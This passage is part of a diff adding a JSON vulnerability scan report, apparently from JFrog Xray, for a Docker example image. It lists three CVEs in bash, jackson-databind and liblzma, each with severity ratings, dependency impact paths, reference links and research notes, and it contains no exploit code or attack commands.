+                  "component_id": "generic://sha256:256d88da41857db513b95b50ba9a9b28491b58c954e25477d5dad8abb465430b/sha256__256d88da41857db513b95b50ba9a9b28491b58c954e25477d5dad8abb465430b.tar",
+                  "full_path": "sha256__256d88da41857db513b95b50ba9a9b28491b58c954e25477d5dad8abb465430b.tar"
+                },
+                {
+                  "component_id": "deb://ubuntu:jammy:bash:5.1-6ubuntu1",
+                  "full_path": "bash:5.1-6ubuntu1"
+                }
+              ]
+            ]
+          }
+        },
+        "issue_id": "XRAY-260678",
+        "references": [
+          "https://ubuntu.com/security/CVE-2022-3715",
+          "https://bugzilla.redhat.com/show_bug.cgi?id=2126720"
+        ],
+        "extended_information": {
+          "short_description": "Out-of-bound read in Bash can lead to denial of service when processing a crafted parameter expansion.",
+          "full_description": "[Bash](https://www.gnu.org/software/bash/) is a Unix shell, which is a command-line interface for interacting with an operating system. It is the default shell for most Linux distributions. Bash allows users to execute commands, manipulate files, and run scripts to automate tasks.\n\nWhen bash is compiled with [ASAN (AdressSanitizer)](https://github.com/google/sanitizers/wiki/AddressSanitizer), a script using a crafted [Shell parameter expansion](https://www.gnu.org/software/bash/manual/html_node/Shell-Parameter-Expansion.html) of type `${parameter@operator}` can lead to out-of-bound read of 1 byte. \nIn some circumstances (ex. Bash is compiled with ASAN) this can crash the bash process, but triggering a crash is unlikely in real-world scenarios.\n\nThe attackers must find a remote input that propagates to a bash script using this special parameter expansion which is not easy at all and very unlikely.",
+          "jfrog_research_severity": "Low",
+          "jfrog_research_severity_reasons": [
+            {
+              "name": "The issue is trivial to exploit and does not require a published writeup or PoC",
+              "description": "Attackers can simply create a parameter transformation on a variable that contains the same parameter transformation"
+            },
+            {
+              "name": "The issue cannot result in a severe impact (such as remote code execution)",
+              "description": "In some circumstances (ex. Bash is compiled with ASAN) exploiting this issue can crash the bash process, but triggering a crash is unlikely in real-world scenarios.",
+              "is_positive": true
+            },
+            {
+              "name": "The prerequisites for exploiting the issue are extremely unlikely",
+              "description": "The attackers must find a remote input that propagates to a bash script using the special parameter expansion `${parameter@operator}` where the parameter is taken from a user-controlled input. \nThis is extremely unlikely to happen in a remote scenario.",
+              "is_positive": true
+            }
+          ]
+        }
+      },
+      {
+        "cves": [
+          {
+            "cve": "CVE-2023-35116",
+            "cvss_v3_score": "4.7",
+            "cvss_v3_vector": "CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:N/I:N/A:H"
+          }
+        ],
+        "summary": "An issue was discovered jackson-databind thru 2.15.2 allows attackers to cause a denial of service or other unspecified impacts via crafted object that uses cyclic dependencies.",
+        "severity": "Medium",
+        "components": {
+          "gav://com.fasterxml.jackson.core:jackson-databind:2.15.2": {
+            "impact_paths": [
+              [
+                {
+                  "component_id": "docker://dsener.jfrog.io/dsener-docker/jfrog-docker-example-image:10"
+                },
+                {
+                  "component_id": "generic://sha256:0089dde713629f2e348bb30fec727b22b74ba3fe71db52b331f6b2f334ba3ee6/sha256__0089dde713629f2e348bb30fec727b22b74ba3fe71db52b331f6b2f334ba3ee6.tar",
+                  "full_path": "sha256__0089dde713629f2e348bb30fec727b22b74ba3fe71db52b331f6b2f334ba3ee6.tar"
+                },
+                {
+                  "component_id": "gav://org.springframework.samples:spring-petclinic:3.1.0-SNAPSHOT",
+                  "full_path": "spring-petclinic.jar"
+                },
+                {
+                  "component_id": "gav://com.fasterxml.jackson.core:jackson-databind:2.15.2",
+                  "full_path": "BOOT-INF/lib/jackson-databind-2.15.2.jar"
+                }
+              ]
+            ]
+          }
+        },
+        "issue_id": "XRAY-522015",
+        "references": [
+          "https://github.com/FasterXML/jackson-databind/issues/3972"
+        ],
+        "extended_information": {
+          "short_description": "(Non-Issue) Excessive recursion in Jackson-databind leads to denial of service when serializing untrusted Java objects.",
+          "jfrog_research_severity": "Low",
+          "jfrog_research_severity_reasons": [
+            {
+              "name": "The prerequisites for exploiting the issue are extremely unlikely",
+              "is_positive": true
+            },
+            {
+              "name": "The reported CVSS was either wrongly calculated, downgraded by other vendors, or does not reflect the vulnerability's impact",
+              "description": "The CVSS does not reflect the fact that the vulnerability was disputed.",
+              "is_positive": true
+            },
+            {
+              "name": "The issue has been disputed by the vendor",
+              "description": "The vulnerable object cannot be serialized through Jackson APIs, making it extremely unlikely that such an object will be deserialized in a real-world scenario",
+              "is_positive": true
+            },
+            {
+              "name": "The issue has an exploit published",
+              "description": "A public crashing PoC was published."
+            }
+          ]
+        }
+      },
+      {
+        "cves": [
+          {
+            "cve": "CVE-2020-22916",
+            "cvss_v3_score": "5.5",
+            "cvss_v3_vector": "CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H"
+          }
+        ],
+        "summary": "** DISPUTED ** An issue discovered in XZ 5.2.5 allows attackers to cause a denial of service via decompression of a crafted file. NOTE: the vendor disputes the claims of \"endless output\" and \"denial of service\" because decompression of the 17,486 bytes always results in 114,881,179 bytes, which is often a reasonable size increase.",
+        "severity": "Medium",
+        "components": {
+          "deb://ubuntu:jammy:liblzma5:5.2.5-2ubuntu1": {
+            "impact_paths": [
+              [
+                {
+                  "component_id": "docker://dsener.jfrog.io/dsener-docker/jfrog-docker-example-image:10"
+                },
+                {
+                  "component_id": "generic://sha256:256d88da41857db513b95b50ba9a9b28491b58c954e25477d5dad8abb465430b/sha256__256d88da41857db513b95b50ba9a9b28491b58c954e25477d5dad8abb465430b.tar",
+                  "full_path": "sha256__256d88da41857db513b95b50ba9a9b28491b58c954e25477d5dad8abb465430b.tar"
+                },
+                {
+                  "component_id": "deb://ubuntu:jammy:liblzma5:5.2.5-2ubuntu1",
+                  "full_path": "liblzma5:5.2.5-2ubuntu1"
+                }
+              ]
+            ]
+          }
+        },
+        "issue_id": "XRAY-531888",
+        "references": [
+          "https://ubuntu.com/security/CVE-2020-22916",
+          "https://bugzilla.suse.com/show_bug.cgi?id=1214590",
+          "https://github.com/snappyJack/CVE-request-XZ-5.2.5-has-denial-of-service-vulnerability",
+          "https://security-tracker.debian.org/tracker/CVE-2020-22916",
+          "http://web.archive.org/web/20230918084612/https://github.com/snappyJack/CVE-request-XZ-5.2.5-has-denial-of-service-vulnerability",
+          "https://github.com/tukaani-project/xz/issues/61",
+          "https://tukaani.org/xz/",
+          "https://bugzilla.redhat.com/show_bug.cgi?id=2234987"
+        ]
+      }
+    ],
+    "component_id": "docker://dsener.jfrog.io/dsener-docker/jfrog-docker-example-image:10",
+    "package_type": "docker",
+    "status": "completed"
+  }
+]
